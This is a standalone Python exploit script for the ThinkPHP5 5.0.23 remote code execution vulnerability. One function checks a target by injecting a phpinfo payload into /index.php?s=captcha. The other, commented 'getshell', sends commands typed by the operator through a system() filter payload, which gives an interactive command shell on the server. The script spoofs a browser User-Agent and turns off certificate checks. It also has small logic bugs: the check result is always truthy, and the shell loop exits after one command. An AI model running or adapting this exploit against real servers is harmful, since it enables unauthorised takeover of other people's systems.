import requests
import re
import urllib

def verify(url):
    relsult = {
        'name': 'ThinkPHP5 5.0.23 Remote Code Execution Vulnerability',
        'vulnerable': False,
        'attack': True,
    }
    try:
        target = url + '/index.php?s=captcha'
        target = urllib.parse.urljoin(url, '/index.php?s=captcha')
        payload = r'_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        response = requests.post(target, data=payload, timeout=3, verify=False, headers=headers)
        response2 = requests.post(target, timeout=3, verify=False, headers=headers)
        if re.search(r'PHP Version', response.text) and not re.search(r'PHP Version', response2.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = target
            relsult['position'] = 'data'
            relsult['payload'] = payload
            relsult['attack'] = True
        return relsult
    except:
        return relsult

# getshell
def attack(url):
    if verify(url):
        print('[+] 存在 ThinkPHP5 5.0.23 Remote Code Execution Vulnerability')
        target = url + '/index.php?s=captcha'
        basic_payload = '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={0}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        cmd_shell = ''
        print('[+] 开始执行命令, 输入exit退出')
        while cmd_shell != 'exit':
            cmd_shell = str(input('[+] 执行命令: '))
            payload = basic_payload.format(cmd_shell)
            response = requests.post(target, data=payload, headers=headers, timeout=3, verify=False)
            output = re.search(r'([^<]*)', response.text)[0]
            print('[*] 执行结果结果:', response.text)
            return True
    else:
        return False
